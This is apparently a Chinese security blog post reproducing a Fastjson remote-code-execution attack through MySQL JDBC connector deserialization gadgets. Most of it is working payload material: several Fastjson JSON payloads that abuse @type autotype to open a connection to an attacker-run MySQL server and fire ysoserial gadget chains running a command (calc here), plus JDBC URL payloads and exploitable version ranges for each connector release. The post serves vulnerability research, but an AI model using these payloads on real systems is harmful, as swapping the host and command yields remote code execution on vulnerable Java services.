## Fastjson MySQL gadget复现



### 漏洞复现



payload：**{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_CommonsBeanutils1_calc\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } }**

其中{ \"user\": \"yso_CommonsBeanutils1_calc\"是`yso\_是固定（反序列化）CommonsBeanutils1\_（gadget）calc是命令`

```
        String json2="{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_CommonsBeanutils1_calc\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } }";
        
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.12</version>
        </dependency>

        
        String json2="{ \"name\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false&user=yso_CommonsBeanutils1_calc\" } } }}";


        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>6.0.2</version>
        </dependency>



```



![image-20211220170706354](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//6u07er6ec/6u07er6ec.png)





![image-20211220154409962](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//42u44er42ec/42u44er42ec.png)



----

```json
{
       "@type":"java.lang.AutoCloseable",
       "@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
       "proxy": {
              "@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
              "connectionUrl":{
                     "@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
                     "masters":[{
                            "host":""
                     }],
                     "slaves":[],
                     "properties":{
                            "host":"127.0.0.1",
                            "user":"yso_CommonsCollections4_calc",
                            "dbname":"dbname",
                            "password":"pass",
                            "queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                            "autoDeserialize":"true"
                     }
              }
       }
}
```



---

以下是MySQL反序列化漏洞影响的版本，fastjson只能打5.1.11-5.1.48(反序列化链)、6.0.2/6.0.3(反序列化)、8.0.19(反序列化链)（实测）。

### 影响版本

#### ServerStatusDiffInterceptor触发

* **<8.0.20:** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
* **6.x(属性名不同):** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
* **5.1.11及以上的5.x版本（包名没有了cj）:**` jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
* **5.1.10及以下的5.1.X版本：** 同上，但是需要连接后执行查询。
* **5.0.x:** 还没有`ServerStatusDiffInterceptor`这个东西┓( ´∀` )┏

#### detectCustomCollations触发：

* **5.1.41及以上:** 不可用
* **5.1.29-5.1.40:** `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`
* **5.1.28-5.1.19：** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc`
* **5.1.18以下的5.1.x版本：** 不可用
* **5.0.x版本不可用**



![image-20211220173824621](https://cdn.jsdelivr.net/gh/SummerSec/Images//52u3652ec52u3652ec.png)



----

### 参考

https://www.cnblogs.com/pickmea/p/15157189.html

https://github.com/fnmsd/MySQL_Fake_Server

https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg